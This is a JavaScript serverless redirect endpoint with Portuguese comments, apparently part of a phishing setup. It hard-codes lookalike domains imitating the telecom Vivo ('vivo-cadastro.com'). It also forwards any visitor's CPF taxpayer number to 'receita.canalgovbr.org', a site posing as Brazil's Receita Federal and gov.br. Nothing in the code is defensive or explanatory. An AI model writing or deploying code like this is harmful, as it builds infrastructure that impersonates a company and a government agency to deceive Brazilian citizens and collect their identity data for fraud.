// api/redirect.js - Endpoint específico para redirecionamento
import { Pool, neonConfig } from '@neondatabase/serverless';
import ws from 'ws';

// Configure WebSocket para o Neon Database
neonConfig.webSocketConstructor = ws;

// Configuração fixa dos domínios, conforme solicitado pelo usuário
const FIXED_CONFIG = {
  domain: 'portal.vivo-cadastro.com',
  alternative_domain: 'atendimentovivo.gupy.io'
};

export default async function handler(req, res) {
  // CORS headers para permitir acesso de qualquer origem
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Verificar se tem CPF na query para redirecionamento da Receita Federal
  if (req.query.cpf) {
    const cpf = req.query.cpf;
    // Validar se o CPF tem 11 dígitos
    if (/^\d{11}$/.test(cpf)) {
      const receitaUrl = `https://receita.canalgovbr.org/${cpf}`;
      console.log('Redirecionando CPF para Receita Federal:', receitaUrl);
      return res.redirect(307, receitaUrl);
    } else {
      console.log('CPF inválido fornecido:', cpf);
      res.status(400).json({ error: 'CPF deve ter 11 dígitos' });
      return;
    }
  }

  // Para qualquer outra rota sem CPF, redirecionar para a página principal
  console.log('Nenhum CPF encontrado, redirecionando para página principal');
  return res.redirect(307, '/dashboard');
}